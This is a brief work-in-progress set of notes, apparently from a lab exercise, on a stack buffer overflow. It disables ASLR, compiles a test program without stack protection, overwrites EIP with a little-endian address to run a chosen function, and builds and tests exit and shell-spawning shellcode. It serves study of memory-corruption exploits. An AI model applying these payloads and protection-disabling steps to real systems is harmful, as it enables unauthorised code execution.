# WIP...

`echo 0 > /proc/sys/kernel/randomize_va_space`


`gcc -g -fno-stack-protector -z execstack -no-pie -o poc poc.c`


### Hijacked

execute foobar function by addr injection in EIP register

> little endian

`echo -ne "AAAABBBBCCCCDDDDD\x86\x91\x04\x08" | xargs ./poc`


## Compile ASM - Test

- `nasm -f elf32 exit.asm -o exit.o`
- `ld -m elf_i386 exit.o -o exit`

hex: `\xb8\x01\x00\x00\x00\xbb\x0a\x00\x00\x00\xcd\x80`

run: `./exit`

test if works: `echo $?`

## Compile shellcode

`gcc -z execstack -m32 -o shellcode shellcode-poc.c`

run: `./shellcode`

test if works: `sh-5.1$ _`


